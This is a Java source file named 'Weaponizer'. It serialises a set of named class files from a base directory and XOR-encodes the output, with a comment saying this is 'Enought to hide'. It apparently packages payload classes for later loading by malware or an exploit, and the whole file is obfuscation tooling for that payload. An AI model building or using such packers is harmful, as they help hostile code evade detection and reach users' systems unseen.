package x;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class Weaponizer {

	public static void main(String[] args) throws Exception {
		if( args.length < 3 ) {
			System.out.println("USAGE: Weaponizer <basedir> <outputfile> (<class>)+");
		}
		EC classes = new EC();
		classes.setBaseDirectory(args[0]); 
		for( int i=2; i<args.length; i++ ) {
     		classes.add(args[i]);
		}
		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		ObjectOutputStream oout = new ObjectOutputStream(bout);
		oout.writeObject(classes);
		byte[] bytes = bout.toByteArray();
		for( int i=0; i<bytes.length; i++ ) {
    		bytes[i] = (byte) (bytes[i] ^ 255); // Enought to hide
    	}
		FileOutputStream fout = new FileOutputStream(args[1]);
		fout.write(bytes);
		fout.close();
	}
	
}
